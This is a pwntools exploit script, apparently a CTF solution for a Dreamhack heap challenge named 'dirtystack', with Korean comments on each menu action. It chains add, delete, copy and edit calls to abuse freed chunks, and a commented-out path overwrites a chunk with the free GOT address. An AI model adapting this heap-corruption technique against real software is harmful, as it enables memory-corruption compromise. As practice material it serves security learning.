from pwn import *

p = remote("host3.dreamhack.games", 13555)

e = ELF("./share/dirtystack")

free_got = e.got['free']

# cur idx를 idx로 설정
# idx가 0이상 9이하 일 경우 count vector 1로 설정 + 0x10만큼 malloc
def add(idx: int, data: bytes):
	p.sendlineafter(b"> ", b"1 0")
	p.sendlineafter(b"index : ", str(idx).encode())
	p.sendline(data)

#add(1, b"A"*8) 
#delete(1) 
#copy(1) 
#edit(b"A"*8+b'\x00')  
#delete(1)
#copy(0)
#delete(0) #0일 경우 free 안하고 cur_idx를 바꿔주는 효과
#edit(p64(free_got))
#add(0, b"A"*8) 
#add(1, b"")
#prnt()

# cur idx를 idx로 설정
# idx가 0이상일 경우 free하고 count vector 0으로 설정
def delete(idx: int):
	p.sendlineafter(b"> ", b"2 0")
	p.sendlineafter(b"index : ", str(idx).encode())

# 0이상 9이하의 chunk들 중에
# count vector1인 애들 전부 출력 
def prnt():
	p.sendlineafter(b"> ", b"3 0")

# 만약 cur idx의 count vector가 1이라면
# cur idx의 chunk 값 수정
def edit(data: bytes):
	p.sendlineafter(b"> ", b"4 0")
	p.sendline(data)

# cur_idx에서 idx로 주소 복사
# cur_idx 변화 x
# idx의 count vector 1로 설정
def copy(idx: int): 
	p.sendlineafter(b"> ", b"5 0")
	p.sendlineafter(b"Copy to : ", str(idx).encode())

def exit():
	p.sendlineafter(b"> ", b"6 0")

add(1, b"A"*8) 
delete(1) 
copy(1) 
edit(b"A"*8+b'\x00')  
delete(1)
copy(0)
delete(0) #0일 경우 free 안하고 cur_idx를 바꿔주는 효과
edit(b"E"*8)
add(0, b"A"*8) 
add(1, b"")
#prnt()



p.interactive()
